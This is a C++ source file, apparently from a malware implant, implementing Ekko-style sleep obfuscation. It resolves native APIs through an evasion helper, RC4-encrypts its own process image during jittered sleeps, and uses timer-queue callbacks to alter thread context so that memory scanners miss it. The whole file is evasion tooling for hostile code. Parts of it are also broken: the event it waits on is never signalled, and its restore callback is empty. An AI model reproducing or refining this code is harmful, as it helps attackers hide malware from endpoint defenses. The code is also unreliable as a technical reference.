#include "ekko.h"
#include "evade.h"

#include <windows.h>
#include <winternl.h>

#include <random>

namespace ekko {

namespace {

struct NtApi {
    NTSTATUS (NTAPI* NtContinue)(PCONTEXT, BOOLEAN);
    NTSTATUS (NTAPI* NtSetContextThread)(HANDLE, PCONTEXT);
    ULONG    (NTAPI* RtlCreateTimer)(HANDLE, HANDLE*, void*, void*, DWORD, ULONG, ULONG);
    NTSTATUS (NTAPI* RtlCaptureContext)(PCONTEXT);
    NTSTATUS (NTAPI* RtlRestoreContext)(PCONTEXT, PEXCEPTION_RECORD);
    void     (NTAPI* RtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
    BOOL     (WINAPI* VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    HANDLE   (WINAPI* CreateEventW)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
    HANDLE   (WINAPI* CreateTimerQueue)();
    BOOL     (WINAPI* CreateTimerQueueTimer)(HANDLE*, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
} g;

using SysFunc032 = NTSTATUS (NTAPI*)(PVOID, PVOID);

struct UString {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
};

constexpr size_t kImageSize = 4 * 1024 * 1024;
void*  g_image_base = nullptr;
size_t g_image_len  = 0;
uint8_t g_key[16]   = {0};

bool ResolveApi() {
    auto p = [](const char* name) { return evade::ResolveNtdll(name); };
    g.NtContinue            = (decltype(g.NtContinue))           p("NtContinue");
    g.NtSetContextThread    = (decltype(g.NtSetContextThread))   p("NtSetContextThread");
    g.RtlCreateTimer        = (decltype(g.RtlCreateTimer))       p("RtlCreateTimer");
    g.RtlCaptureContext     = (decltype(g.RtlCaptureContext))    p("RtlCaptureContext");
    g.RtlRestoreContext     = (decltype(g.RtlRestoreContext))    p("RtlRestoreContext");
    g.RtlAddFunctionTable   = (decltype(g.RtlAddFunctionTable))  p("RtlAddFunctionTable");

    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE ntd = GetModuleHandleW(L"ntdll.dll");
    if (!k32 || !ntd) return false;

    g.VirtualProtect        = (decltype(g.VirtualProtect))       GetProcAddress(k32, "VirtualProtect");
    g.CreateEventW          = (decltype(g.CreateEventW))         GetProcAddress(k32, "CreateEventW");
    g.CreateTimerQueue      = (decltype(g.CreateTimerQueue))     GetProcAddress(k32, "CreateTimerQueue");
    g.CreateTimerQueueTimer = (decltype(g.CreateTimerQueueTimer))GetProcAddress(k32, "CreateTimerQueueTimer");

    return g.NtContinue && g.RtlCreateTimer && g.RtlCaptureContext &&
           g.RtlRestoreContext && g.VirtualProtect && g.CreateEventW &&
           g.CreateTimerQueue && g.CreateTimerQueueTimer;
}

void Rc4(const uint8_t* key, size_t keylen, void* data, size_t len) {
    uint8_t s[256];
    for (int i = 0; i < 256; ++i) s[i] = uint8_t(i);
    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) & 0xFF;
        std::swap(s[i], s[j]);
    }
    int a = 0, b = 0;
    uint8_t* p = (uint8_t*)data;
    for (size_t i = 0; i < len; ++i) {
        a = (a + 1) & 0xFF;
        b = (b + s[a]) & 0xFF;
        std::swap(s[a], s[b]);
        p[i] ^= s[(s[a] + s[b]) & 0xFF];
    }
}

void EncryptImage(bool encrypt) {
    if (!g_image_base || !g_image_len) return;
    uint8_t* base = (uint8_t*)g_image_base;
    size_t   len  = g_image_len;
    const uint8_t* key = g_key;

    DWORD old = 0;
    g.VirtualProtect(base, len, PAGE_READWRITE, &old);
    for (size_t off = 0; off < len; off += 4096) {
        Rc4(key, 16, base + off, 4096);
    }
    if (encrypt) {
        g.VirtualProtect(base, len, PAGE_EXECUTE_READ, &old);
    } else {
        g.VirtualProtect(base, len, PAGE_EXECUTE_READ, &old);
    }
}

void AdvanceTo(PCONTEXT ctx, PVOID target) {
    ctx->Rip = (DWORD64)target;
    ctx->Rsp = (DWORD64)((uintptr_t)ctx->Rsp - 8);
}

void CallbackA(PCONTEXT ctx)        { AdvanceTo(ctx, (PVOID)g.RtlCreateTimer); }
void CallbackSleep(PCONTEXT ctx)    { EncryptImage(true);  AdvanceTo(ctx, (PVOID)WaitForSingleObject); }
void CallbackRestore(PCONTEXT ctx)  { (void)ctx; }

}

bool Init() {
    if (!ResolveApi()) return false;

    HMODULE self = GetModuleHandleW(nullptr);
    g_image_base = self;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)self;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)self + dos->e_lfanew);
    g_image_len = nt->OptionalHeader.SizeOfImage;

    LARGE_INTEGER c; QueryPerformanceCounter(&c);
    std::mt19937 rng(uint32_t(c.QuadPart ^ GetTickCount64()));
    for (auto& b : g_key) b = uint8_t(rng());
    return true;
}

void SleepObfuscated(uint32_t ms, uint32_t jitter) {
    if (!g.NtContinue) return;

    if (jitter > 0) {
        std::mt19937 rng(GetTickCount());
        std::uniform_int_distribution<int> d(-int(jitter), int(jitter));
        ms = uint32_t(int(ms) + int(ms) * d(rng) / 100);
    }

    HANDLE event = g.CreateEventW(nullptr, FALSE, FALSE, nullptr);
    HANDLE timer = nullptr;
    HANDLE tq    = g.CreateTimerQueue();

    CONTEXT ctx{};
    g.RtlCaptureContext(&ctx);

    g.CreateTimerQueueTimer(&timer, tq, (WAITORTIMERCALLBACK)CallbackRestore,
                             nullptr, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(event, INFINITE);

    EncryptImage(true);
    g.CreateTimerQueueTimer(&timer, tq, (WAITORTIMERCALLBACK)CallbackA,
                             &ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(event, INFINITE);
}

}